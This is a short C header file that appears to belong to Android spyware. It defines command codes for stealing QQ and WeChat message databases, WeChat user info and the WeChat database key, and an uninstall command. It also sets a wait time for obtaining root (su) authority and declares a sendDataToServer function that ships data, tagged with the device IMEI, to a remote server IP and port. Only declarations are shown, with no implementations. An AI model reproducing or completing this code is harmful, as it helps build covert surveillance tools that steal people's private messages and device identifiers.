

#ifndef PUBLIC_H_H_H
#define PUBLIC_H_H_H




#define WAIT_SU_AUTHORITY_SECONDS 6

#define CMD_UNINSTALL 			46
#define CMD_QQDATABASEFILE 		48
#define CMD_WEIXINDATABASEFILE 	49
#define CMD_WEIXINUSERINFO 		50
#define CMD_WEIXINDB_KEY 		51
#define IMEI_IMSI_PHONE_SIZE 	16

#define NETWORK_DATABUF_SIZE 	0x10000


#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

int sendDataToServer(const char * pdata,int datasize,int command,char * logfilename,char * serverip,int serverport,
		char *imei,char * clientname);
int getPathFormFullName(char * fullpath,char * path);
unsigned short __ntohs(unsigned short us);
int writeLog(char * logfilename,const char * plog);




#endif
